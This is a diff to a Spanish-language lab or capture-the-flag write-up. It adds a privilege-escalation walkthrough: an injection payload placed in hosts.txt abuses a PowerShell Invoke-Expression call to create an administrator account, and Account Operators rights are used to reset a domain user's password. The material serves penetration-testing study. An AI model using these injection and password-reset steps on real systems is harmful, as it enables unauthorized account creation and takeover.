@@ -386,7 +386,7 @@ Pero no sin antes abrir el Responder, una vez abierto nos deberia llegar el hash
 ```
 uzunLM+3131      (buse)
 ```
-Con esas creds podemos acceder al servicio de administracion del puerto 443
+Con esas creds podemos acceder al servicio de administracion del puerto 443 o acceder por winRM
 
 ## Privesc
 Con las cred + evilwinRM podemos acceder al sistema y leer la flag 2
@@ -515,5 +515,31 @@ if ($OutageHosts.Count -gt $MaxOutageCount)
 }
 while ($Exit -ne $True)
 ```
-Al ejecutarlo obtenemos un error de permisos al no ser Britanny, parece el camino a seguir
+Al ejecutarlo obtenemos un error de permisos al no ser Britanny, si miramos de cerca podemos ver que hay una llamada un tanto peligrosa
+```
+get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |
+ForEach-Object {
+    $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
+    Invoke-Expression $p
+```
+Veamos lo que hace Invoke-Expression
+```
+The Invoke-Expression cmdlet evaluates or runs a specified string as a command and returns the results of the expression or command. Without Invoke-Expression, a string submitted at the command line is returned (echoed) unchanged.
+```
+Es decir cualquier cosa que lee del archivo va a ser interpretada por powershell como un comando de la siguiente manera
+```
+Test-Connection -ComputerName CMD -Count 1 -ea silentlycontinue
+```
+Asi que podemos hacer lo siguiente con añadir ";net user bleu bleupassword /add;net localgroup Administrators bleu /add" al archivo de los hosts
+```
+Test-Connection -ComputerName ;net user bleu bleupassword /add;net localgroup Administrators bleu /add -Count 1 -ea silentlycontinue
+```
+Obstaculo: no somos brytany
+Fortaleza: Somos BUILTIN\Account Operators
+
+Siendo Account Operator podemos modificar la contraseña de bryttany y ser bryttany:
+```
+net user brittanycr Pass4321 /domain
+```
+No podemos entrar usando el WinRm pero si en SMBClient entramos y desde ahi editamos el host.txt añadiendo lo que queremos, solo nos falta que se ejecute para poder acceder como nuestro usuario
 
